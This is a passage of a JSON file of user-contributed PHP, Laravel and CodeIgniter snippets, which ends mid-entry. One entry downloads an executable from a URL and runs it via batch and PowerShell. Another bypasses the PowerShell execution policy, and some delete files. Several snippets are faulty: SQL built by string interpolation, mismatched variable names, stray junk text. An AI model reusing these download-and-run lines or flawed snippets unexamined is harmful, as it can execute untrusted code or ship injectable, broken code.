    "title": " check session in blade laravel",
    "description": "@if(session()->has('qwick'))     @else      @endif\n@if(Session::has('error')) <div class=\"alert alert-danger\">   {{ Session::get('error')}} </div> @endif \n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 656,
    "keyword": null,
    "link": null,
    "title": " check session php",
    "description": "// For PHP versions > 5.4.0  if (session_status() === PHP_SESSION_NONE) {     session_start(); }  // For PHP Versions < 5.4.0  if(session_id() == '') {     session_start(); } \n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 657,
    "keyword": null,
    "link": null,
    "title": " check table exists in db laravel",
    "description": "if (!Schema::hasTable('table_name')) {     // Code to create table }\nif (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\nFOR LUMEN FOR migrate job  BOOTSTRAP/APP.PHP       if(\\Illuminate\\Support\\Facades\\Schema::hasTable(\"jobs\")) Queue::push(new ProcessCenterJob());\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 658,
    "keyword": null,
    "link": null,
    "title": " check the php version in ubuntu",
    "description": " php --version \nphp -version\n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 659,
    "keyword": null,
    "link": null,
    "title": " check type in php",
    "description": "gettype($u)\ngettype ( mixed $var ) : string \n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 660,
    "keyword": null,
    "link": null,
    "title": " check value contains numbers or letters php",
    "description": "ctype_digit(string text);  Parameter Used: The ctype_digit() function in PHP accepts only one parameter.  text : Its mandatory parameter which specifies the tested string.  Return Values: It returns TRUE if all characters of the string are numeric otherwise    return FALSE.    Input  : '789495001' Output : TRUE Explanation : All digits, return True  Input  : 'adc123' or '789.0877' Output : FALSE Explanation: String contains number and string or floating point,  return false.                   \nis_numeric ( $var )    returns : true or false  '42' is numeric 1337 is numeric 1337 is numeric 1337 is numeric 1337 is numeric 1337.0 is numeric '0x539' is NOT numeric '02471' is numeric '0b10100111001' is NOT numeric '1337e0' is numeric 'not numeric' is NOT numeric array ( ) is NOT numeric 9.1 is numeric NULL is NOT numeric     \n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 661,
    "keyword": null,
    "link": null,
    "title": " check value falls between in two range in php",
    "description": "($min <= $value) && ($value <= $max)\n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 662,
    "keyword": null,
    "link": null,
    "title": " check which database connect laravel",
    "description": "DB::connection();\n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 663,
    "keyword": null,
    "link": null,
    "title": " checking php version",
    "description": "<?php echo 'PHP version: ' . phpversion(); ?>\n<?php   echo 'PHP version:' . phpinfo(); ?>  \nset PATH=%PATH%;C:\\path\\to\\php \n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 664,
    "keyword": null,
    "link": null,
    "title": " choose a random word from an array php",
    "description": "$items = array(1, 2, 3, 4, 5); echo $items[array_rand($items)];\n<?php //array_rand ( array $array [, int $num = 1 ] )  $input = array(\"Neo\", \"Morpheus\", \"Trinity\", \"Cypher\", \"Tank\"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . \"\\n\"; echo $input[$rand_keys[1]] . \"\\n\"; ?>  \n<?php // array_rand() + shuffle $answers = Array('Hello!','Salut!','Vivat!','Chao!','Привет'); shuffle($answers); echo $answers[array_rand($answers)];  // I use it for BotMan: $botman->hears('Hi', function ($bot) {     $answers = Array('Hello!','Salut!','Vivat!','Chao!','Привет');     shuffle($answers);     $bot->reply($answers[array_rand($answers)]); });\n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 665,
    "keyword": null,
    "link": null,
    "title": " ci db query error",
    "description": "$this->db->error();  \n",
    "reg_date": "2021-10-12T10:13:07.000Z"
  },
  {
    "id": 666,
    "keyword": null,
    "link": null,
    "title": " class 'illuminate support facades input' not found laravel 7",
    "description": "In Laravel 5.2 Input:: is replaced with Request::  use Request::  Add to the top of Controller or any other Class  use Illuminate\\Support\\Facades\\Request;\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 667,
    "keyword": null,
    "link": null,
    "title": " class php",
    "description": "<?php class Fruit {   public $name;   public $color;    function __construct($name, $color) {     $this->name = $name;     $this->color = $color;   }   function get_name() {     return $this->name;   }   function get_color() {     return $this->color;   } }  $apple = new Fruit(\"Apple\", \"red\"); echo $apple->get_name(); echo \"<br>\"; echo $apple->get_color(); ?>\nclass Bike {     \tfunction Bike() {             $this->type = 'BMX';     } }  $blackSheep = new Bike();  print $blackSheep->type;\n <?php class Foo {     public $aMemberVar = 'aMemberVar Member Variable';     public $aFuncName = 'aMemberFunc';             function aMemberFunc() {         print 'Inside `aMemberFunc()`';     } }  $foo = new Foo;  function getVarName() {      return 'aFuncName';  }  print $foo->{$foo->{getVarName()}}();  \ntest234234234234\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 668,
    "keyword": null,
    "link": null,
    "title": " class static php",
    "description": " <?php class ClassName {   public static function staticMethod() {     echo \"Hello World!\";   } } ?> \n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 669,
    "keyword": null,
    "link": null,
    "title": " clear all cache in laravel",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache \nphp artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 670,
    "keyword": null,
    "link": null,
    "title": " clear array php",
    "description": "//To clear array you are able to simply re-instantiate it $foo = array();  //To clear $foo from the symbol table use unset($foo);\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 671,
    "keyword": null,
    "link": null,
    "title": " clear bootstrap cache laravel",
    "description": "      Clear cache before you deploy the application      php artisan cache:clear      Clear cache manually      rm -rf bootstrap/cache/* \n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 672,
    "keyword": null,
    "link": null,
    "title": " clear cache via route laravel",
    "description": "php artisan cache:clear  php artisan route:cache   \n//Clear Cache facade value: Route::get('/clear-cache', function() {     $exitCode = Artisan::call('cache:clear');     return '<h1>Cache facade value cleared</h1>'; });  //Reoptimized class loader: Route::get('/optimize', function() {     $exitCode = Artisan::call('optimize');     return '<h1>Reoptimized class loader</h1>'; });  //Route cache: Route::get('/route-cache', function() {     $exitCode = Artisan::call('route:cache');     return '<h1>Routes cached</h1>'; });  //Clear Route cache: Route::get('/route-clear', function() {     $exitCode = Artisan::call('route:clear');     return '<h1>Route cache cleared</h1>'; });  //Clear View cache: Route::get('/view-clear', function() {     $exitCode = Artisan::call('view:clear');     return '<h1>View cache cleared</h1>'; });  //Clear Config cache: Route::get('/config-cache', function() {     $exitCode = Artisan::call('config:cache');     return '<h1>Clear Config cleared</h1>'; }); \n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 673,
    "keyword": null,
    "link": null,
    "title": " clear cache without using composer in laravel 8",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \nRoute::get('/clear-cache', function() {     $exitCode = Artisan::call('cache:clear');     // return what you want });\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 674,
    "keyword": null,
    "link": null,
    "title": " clear composer cache",
    "description": "composer clearcache //Then autoload composer composer dump-autoload\ncomposer clearcache  #You can also use   composer clear-cache  #which is an alias for clearcache.  \n$ composer clearcache \n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 675,
    "keyword": null,
    "link": null,
    "title": " clear laravel.log",
    "description": "truncate -s 0 storage/logs/laravel.log\n//routes/console.php  Artisan::command('logs:clear', function() {      exec('rm ' . storage_path('logs/*.log'));      $this->comment('Logs have been cleared!');  })->describe('Clear log files');   //php artisan logs:clear\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 676,
    "keyword": null,
    "link": null,
    "title": " clear laravel cache",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan optimize:clear\nphp artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\n",
    "reg_date": "2021-10-12T10:13:08.000Z"
  },
  {
    "id": 677,
    "keyword": null,
    "link": null,
    "title": " clear log file laravel command",
    "description": "truncate -s 0 storage/logs/laravel.log\n//routes/console.php  Artisan::command('logs:clear', function() {      exec('rm ' . storage_path('logs/*.log'));      $this->comment('Logs have been cleared!');  })->describe('Clear log files');   //php artisan logs:clear\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 678,
    "keyword": null,
    "link": null,
    "title": " clear session php",
    "description": "session_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php    unset($_SESSION['counter']); ?>\n<?php // Destroy the currently active session. session_destroy(); ?>\n<?php session_destroy(); ?>  \nrm -fr  /var/lib/php/sessions/*\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 679,
    "keyword": null,
    "link": null,
    "title": " click confirm before submit form php",
    "description": "onclick=\"return confirm('Are you sure you want to submit this form?')\"\n<form action=\"adminprocess.php\" method=\"POST\" onsubmit=\"return confirm('Are you sure you want to submit this form?');\">     <input type=\"submit\" name=\"completeYes\" value=\"Complete Transaction\" /> </form>\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 680,
    "keyword": null,
    "link": null,
    "title": " close mysql connection in php",
    "description": "// OOP $conn->close();  //Procedural mysqli_close($conn);\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 681,
    "keyword": null,
    "link": null,
    "title": " cloudinary laravel",
    "description": "composer require cloudinary-labs/cloudinary-laravel php artisan vendor:publish --provider=\"CloudinaryLabs\\CloudinaryLaravel\\CloudinaryServiceProvider\" --tag=\"cloudinary-laravel-config\"  #Open your .env file and add your API Environment variable, upload_preset (this is optional, until you need to use the widget) like so: //CLOUDINARY_URL=xxxxxxxxxxxxx //CLOUDINARY_UPLOAD_PRESET=xxxxxxxxxxxxx //CLOUDINARY_NOTIFICATION_URL=\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 682,
    "keyword": null,
    "link": null,
    "title": " cmd download file",
    "description": "curl -o print.pdf https://html.spec.whatwg.org/print.pdf --ssl-no-revoke\nbitsadmin.exe /transfer \"JobName\" http://download.url/here.exe C:\\destination\\here.exe \n@echo off :: method one  rem powershell -Command \"Invoke-Webrequest -URI https://files03.tchspt.com/temp/jdk-8u261-windows-x64.exe -Outfile jdk-8u261-windows-x64.exe\"  if exist \"%USERPROFILE%\\desktop\\jdk-8u261-windows-x64.exe\" goto run :run  call \"%USERPROFILE%\\desktop\\jdk-8u261-windows-x64.exe\" pause  :: method two  powershell -Command \"Start-BitsTransfer -Source https://files03.tchspt.com/temp/jdk-8u261-windows-x64.exe -Destination $env:USERPROFILE\\Desktop\\jdk-8u261-windows-x64.exe -TransferType Download -Priority High -DisplayName jdk-8u261-windows-x64.exe\"  if exist \"%USERPROFILE%\\desktop\\jdk-8u261-windows-x64.exe\" goto run :run  call \"%USERPROFILE%\\desktop\\jdk-8u261-windows-x64.exe\" pause\niwr -outf index.html http://superuser.com \ncurl http://example.org/picture.jpg\nInvoke-WebRequest -OutFile index.html http://superuser.com \n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 683,
    "keyword": null,
    "link": null,
    "title": " cmd run powershell command",
    "description": "powershell -ExecutionPolicy Bypass -Command \"your script here\" \n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 684,
    "keyword": null,
    "link": null,
    "title": " codeigniter4 route optional parameter",
    "description": "$routes->get('logout', 'Login::logout') $routes->get('logout/(:any)', 'Login::logout/$1') $routes->get('logout/(:any)/(:any)', 'Login::logout/$1/$2') $routes->get('logout/(:any)/(:any)/(:any)', 'Login::logout/$1/$2/$3') $routes->get('logout/(:any)/(:any)/(:any)/(:any)', 'Login::logout/$1/$2/$3/$4') $routes->get('logout/(:any)/(:any)/(:any)/(:any)/(:any)', 'Login::logout/$1/$2/$3/$4/$5') \n$routes->get('logout/(:any)', 'Login::logout/$1'); $routes->get('logout', 'Login::logout');   public function logout($param1 = null, $param2 = null, $param3 = null) {     var_dump($param1, $param2, $param3); exit; }\n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 685,
    "keyword": null,
    "link": null,
    "title": " codeigniter 3 Configured database connection has cache enabled",
    "description": " #Try this solution  #https://stackoverflow.com/a/69099463/12749179 \n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 686,
    "keyword": null,
    "link": null,
    "title": " codeigniter 3 insert",
    "description": "$data = array(         'title' => 'My title',         'name' => 'My Name',         'date' => 'My date' );  $this->db->insert('mytable', $data); // Produces: INSERT INTO mytable (title, name, date) VALUES ('My title', 'My name', 'My date') \n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);                 $this->db->_protect_identifiers = FALSE; // stop CI adding backticks                 $order = sprintf('FIELD(ae_users.employee_id, %s)', implode(', ', $employee_ids));                 $this->db->order_by($order);                 $this->db->_protect_identifiers = TRUE;  \t\t$query =$this->db->get();                // echo '<pre>'; print_r($this->db->last_query());exit; \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n$data = array(         'title' => 'My title',         'name' => 'My Name',         'date' => 'My date' );  $this->db->insert('mytable', $data); // Produces: INSERT INTO mytable (title, name, date) VALUES ('My title', 'My name', 'My date')\n$this->db->like('title', 'match'); $this->db->or_like('body', $match); // WHERE `title` LIKE '%match%' ESCAPE '!' OR  `body` LIKE '%match%' ESCAPE '!' \n",
    "reg_date": "2021-10-12T10:13:09.000Z"
  },
  {
    "id": 687,
    "keyword": null,
    "link": null,
    "title": " codeigniter 3 smtp email send",
    "description": "CodeIgniter Email Configuration We need to have a central place where we can manage the email settings. CodeIgniter does not come with a config file for emails so we will have to create one ourselves.  Create a file email.php in the directory application/config  Add the following code to email.php  <?php defined('BASEPATH') OR exit('No direct script access allowed');  $config = array(     'protocol' => 'smtp', // 'mail', 'sendmail', or 'smtp'     'smtp_host' => 'smtp.example.com',      'smtp_port' => 465,     'smtp_user' => 'no-reply@example.com',     'smtp_pass' => '12345!',     'smtp_crypto' => 'ssl', //can be 'ssl' or 'tls' for example     'mailtype' => 'text', //plaintext 'text' mails or 'html'     'smtp_timeout' => '4', //in seconds     'charset' => 'iso-8859-1',     'wordwrap' => TRUE ); ?> HERE, 'protocol' => 'smtp', specifies the protocol that you want to use when sending email. This could be Gmail smtp settings or smtp settings from your host 'smtp_host' => 'smtp.example.com',specifies the smtp host. For example, if you want to use Gmail then you would have something like smtp.gmail.com 'smtp_port' => 465, an open port on the specified smtp host that has been configured for smtp mail 'smtp_user' => 'no-reply@example.com', the email address that will be used as the sender when sending emails. This should be a valid email address that exists on the server 'smtp_pass' => '12345!', the password to the specified smtp user email 'smtp_crypto' => 'ssl', specifies the encryption method to be used i.e. ssl, tls etc. 'email type' => 'text', sets the mail type to be used. This can be either plain text or HTML depending on your needs. 'smtp_timeout' => '4', specifies the time in seconds that should elapse when trying to connect to the host before a timeout exception is thrown. 'charset' => 'iso-8859-1', defines the character set to be used when sending emails. 'wordwrap' => TRUE is set to TRUE then word-wrap is enabled. If it is set to FALSE, then word-wrap is not enabled  <?php    $this->load->config('email');   $this->load->library('email');    $from = $this->config->item('smtp_user');   $to = $this->input->post('to');   $subject = $this->input->post('subject');   $message = $this->input->post('message');    $this->email->set_newline(\"\\r\\n\");   $this->email->from($from);   $this->email->to($to);   $this->email->subject($subject);   $this->email->message($message);    if ($this->email->send()) {     echo 'Your Email has successfully been sent.';   } else {     show_error($this->email->print_debugger());   }   ?>\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 688,
    "keyword": null,
    "link": null,
    "title": " codeigniter 4 get last query",
    "description": "print_r($this->db->last_query());    \n$this->db->last_query();\n$this->db->last_query();  Returns the last query that was run (the query string, not the result). Example: $str = $this->db->last_query();  // Produces: SELECT * FROM sometable....  \nWe can get last executed query using last_query() function of db class in codeigniter. It is a very simple to use $this->db->last_query() function to see SQL statements of last executed query in php codeigniter app. You have to simple code that function after your main query that you wanted check  $this->db->last_query()\n$data['lastQuery'] = $db->getLastQuery(); //ci4\npublic function test_db(){    $query = $this->db->get(\"items\");      $str = $this->db->last_query();       echo \"<pre>\";    print_r($str);    exit;}\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 689,
    "keyword": null,
    "link": null,
    "title": " codeigniter 4 redirect to home",
    "description": "//You can use redirect in codeigniter by loading helper 'url' $this->load->helper('url');  //The redirects functions accepts two parameters to execute the function first is 'Location Url' and second parameter allows the developer to use different HTTP commands to perform the redirect \"location\" or \"refresh\". if (!$user_logged_in) {   redirect('/account/login', 'refresh'); }\n$this->load->helper('url'); redirect('/account/login', 'refresh');\nreturn redirect()->to(site_url()); \n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 690,
    "keyword": null,
    "link": null,
    "title": " codeigniter apache remove index.php",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\n1. Change $config['index_page'] = \"index.php\" to $config['index_page'] = \"\" in config.php 2. Change $config['uri_protocol'] =\"AUTO\" to $config['uri_protocol'] = \"REQUEST_URI\" in config.php 3. Create .htaccess file in root dir of your application and paste the following code   \tRewriteEngine on \tRewriteCond $1 !^(index\\.php|resources|robots\\.txt) \tRewriteCond %{REQUEST_FILENAME} !-f \tRewriteCond %{REQUEST_FILENAME} !-d \tRewriteRule ^(.*)$ index.php/$1 [L,QSA]  \n#in apache mod rewrite is disabled a2enmod rewrite\nRewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA] \nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 691,
    "keyword": null,
    "link": null,
    "title": " codeigniter check affected rows",
    "description": "return $this->db->affected_rows() > 0;\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 692,
    "keyword": null,
    "link": null,
    "title": " codeigniter count rows",
    "description": "$this->db->where('EmpID >=', 5); $query = $this->db->get('Employees'); echo $query->num_rows();  // Outputs, 4 \n$this->db   ->where(['field'=>'foo'])   ->from(\"tablename\")   ->count_all_results();  //OR  $this->db   ->where(['field'=>'foo'])   ->count_all_results(\"tablename\");\npublic function record_count() {    return $this->db->count_all(\"tablename\"); }\n$this->db->select('id'); $this->db->from('table'); $this->db->where($your_conditions); $num_results = $this->db->count_all_results();\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 693,
    "keyword": null,
    "link": null,
    "title": " codeigniter db where between",
    "description": "$minvalue = '2020-01-01 00:00:00'; $max_value = '2050-12-31 23:59:59'; $this->db->where(\"date_field BETWEEN '$minvalue' AND '$maxvalue'\");\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 694,
    "keyword": null,
    "link": null,
    "title": " codeigniter delete record by id",
    "description": "//include this in your controller public function delete_record($eid){     $delete = $this->your_model->delete_record($id);     if ($delete == FALSE) {       $this->session->set_flashdata('error', 'Employee deletion failed, try again.');       redirect('your_view', 'refresh');     } else {       $this->session->set_flashdata('success', 'Employee deleted successfully.');       redirect('your_view', 'refresh');     }  }  //include this in your model public function delete_record($id){ \t$deleted = $this->db->delete('mytable', array('id' => $id));     return $deleted; }\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 695,
    "keyword": null,
    "link": null,
    "title": " codeigniter distinct",
    "description": "<?php $this->db->distinct(); $this->db->select('accessid'); $this->db->where('record', $record);  $query = $this->db->get('accesslog');\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 696,
    "keyword": null,
    "link": null,
    "title": " codeigniter email print debugger",
    "description": " echo $this->email->print_debugger();\n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 697,
    "keyword": null,
    "link": null,
    "title": " codeigniter form validation email",
    "description": "$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email'); \n",
    "reg_date": "2021-10-12T10:13:10.000Z"
  },
  {
    "id": 698,
    "keyword": null,
    "link": null,
    "title": " codeigniter get last query",
    "description": "print_r($this->db->last_query());    \n$this->db->last_query();\n$this->db->last_query();  Returns the last query that was run (the query string, not the result). Example: $str = $this->db->last_query();  // Produces: SELECT * FROM sometable....  \nWe can get last executed query using last_query() function of db class in codeigniter. It is a very simple to use $this->db->last_query() function to see SQL statements of last executed query in php codeigniter app. You have to simple code that function after your main query that you wanted check  $this->db->last_query()\npublic function test_db(){    $query = $this->db->get(\"items\");      $str = $this->db->last_query();       echo \"<pre>\";    print_r($str);    exit;}\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 699,
    "keyword": null,
    "link": null,
    "title": " codeigniter get num rows",
    "description": "// num rows example $this->db->select('*'); $this->db->where('whatever'); $query = $this->db->get('table'); $num = $query->num_rows();\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 700,
    "keyword": null,
    "link": null,
    "title": " codeigniter get user ip",
    "description": "$ip = $this->input->ip_address(); echo $ip; \n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 701,
    "keyword": null,
    "link": null,
    "title": " codeigniter load form validation",
    "description": "$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email'); \n<?php  class Form extends CI_Controller {          public function index()         {                 $this->load->helper(array('form', 'url'));                  $this->load->library('form_validation');                  if ($this->form_validation->run() == FALSE)                 {                         $this->load->view('myform');                 }                 else                 {                         $this->load->view('formsuccess');                 }         } } \n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 702,
    "keyword": null,
    "link": null,
    "title": " codeigniter order by",
    "description": "$this->db->from($this->table_name); $this->db->order_by(\"name\", \"asc\"); $query = $this->db->get();  return $query->result();\n$this->db->from($this->table_name); $this->db->order_by(\"name\", \"asc\"); $query = $this->db->get();  return $query->result(); \n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);                 $this->db->_protect_identifiers = FALSE; // stop CI adding backticks                 $order = sprintf('FIELD(ae_users.employee_id, %s)', implode(', ', $employee_ids));                 $this->db->order_by($order);                 $this->db->_protect_identifiers = TRUE;  \t\t$query =$this->db->get();                // echo '<pre>'; print_r($this->db->last_query());exit; \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 703,
    "keyword": null,
    "link": null,
    "title": " codeigniter query builder order by",
    "description": "$this->db->order_by('title', 'DESC'); // Produces: ORDER BY `title` DESC \n$names = array('Frank', 'Todd', 'James'); $this->db->where_not_in('username', $names); // Produces: WHERE username NOT IN ('Frank', 'Todd', 'James') \n$this->db->like('title', 'match'); $this->db->or_like('body', $match); // WHERE `title` LIKE '%match%' ESCAPE '!' OR  `body` LIKE '%match%' ESCAPE '!' \n$this->db->order_by('RegisteredUserID','ASC') // Produces: ORDER BY `RegisteredUserID` ASC  $this->db->order_by('RegisteredUserID','DESC') // Produces: ORDER BY `RegisteredUserID` DESC\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 704,
    "keyword": null,
    "link": null,
    "title": " codeigniter redirect",
    "description": "//You can use redirect in codeigniter by loading helper 'url' $this->load->helper('url');  //The redirects functions accepts two parameters to execute the function first is 'Location Url' and second parameter allows the developer to use different HTTP commands to perform the redirect \"location\" or \"refresh\". if (!$user_logged_in) {   redirect('/account/login', 'refresh'); }\n$this->load->helper('url'); redirect('/account/login', 'refresh');\nreturn redirect()->to(site_url()); \n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 705,
    "keyword": null,
    "link": null,
    "title": " codeigniter table list",
    "description": "$tables = $this->db->list_tables();  foreach ($tables as $table) {         echo $table; }\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 706,
    "keyword": null,
    "link": null,
    "title": " codeigniter update",
    "description": "$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data); // Produces: // //      UPDATE mytable //      SET title = '{$title}', name = '{$name}', date = '{$date}' //      WHERE id = $id \n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);                 $this->db->_protect_identifiers = FALSE; // stop CI adding backticks                 $order = sprintf('FIELD(ae_users.employee_id, %s)', implode(', ', $employee_ids));                 $this->db->order_by($order);                 $this->db->_protect_identifiers = TRUE;  \t\t$query =$this->db->get();                // echo '<pre>'; print_r($this->db->last_query());exit; \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n$names = array('Frank', 'Todd', 'James'); $this->db->where_not_in('username', $names); // Produces: WHERE username NOT IN ('Frank', 'Todd', 'James') \n$data = [         'title' => $title,         'name'  => $name,         'date'  => $date ];  $builder->where('id', $id); $builder->update($data); // Produces: // //      UPDATE mytable //      SET title = '{$title}', name = '{$name}', date = '{$date}' //      WHERE id = $id \npublic function update_row(){ \t\t \t\t$update_rows = array( \t\t\t'name' => 'rincky', \t\t\t'address' => 'India', \t\t\t'contact' => '98545785', \t\t\t'department' => 'IT',  \t\t); \t\t$this->db->where('id', 1 ); \t\t$result = $this->db->update('user', $update_rows);\t \t\treturn $result; \t}\t\n$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data);\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 707,
    "keyword": null,
    "link": null,
    "title": " codeigniter update query return value",
    "description": "$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data); // Produces: // //      UPDATE mytable //      SET title = '{$title}', name = '{$name}', date = '{$date}' //      WHERE id = $id \npublic function update_row(){ \t\t \t\t$update_rows = array( \t\t\t'name' => 'rincky', \t\t\t'address' => 'India', \t\t\t'contact' => '98545785', \t\t\t'department' => 'IT',  \t\t); \t\t$this->db->where('id', 1 ); \t\t$result = $this->db->update('user', $update_rows);\t \t\treturn $result; \t}\t\n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 708,
    "keyword": null,
    "link": null,
    "title": " codeigniter where date interval",
    "description": "$this->db->where('order_date >=', $first_date); $this->db->where('order_date <=', $second_date); return $this->db->get('orders'); \n",
    "reg_date": "2021-10-12T10:13:11.000Z"
  },
  {
    "id": 709,
    "keyword": null,
    "link": null,
    "title": " codeigniter where not in",
    "description": "$names = array('Frank', 'Todd', 'James'); $this->db->where_not_in('username', $names); // Produces: WHERE username NOT IN ('Frank', 'Todd', 'James') \n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);       \t\t$query =$this->db->get();               \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n$this->db->like('title', 'match'); $this->db->or_like('body', $match); // WHERE `title` LIKE '%match%' ESCAPE '!' OR  `body` LIKE '%match%' ESCAPE '!' \n$this->db->select('*')->from('my_table')         ->group_start()                 ->where('a', 'a')                 ->or_group_start()                         ->where('b', 'b')                         ->where('c', 'c')                 ->group_end()         ->group_end()         ->where('d', 'd') ->get();  // Generates: // SELECT * FROM (`my_table`) WHERE ( `a` = 'a' OR ( `b` = 'b' AND `c` = 'c' ) ) AND `d` = 'd' \n$table = \"my_table\"; $id = 1; $update = 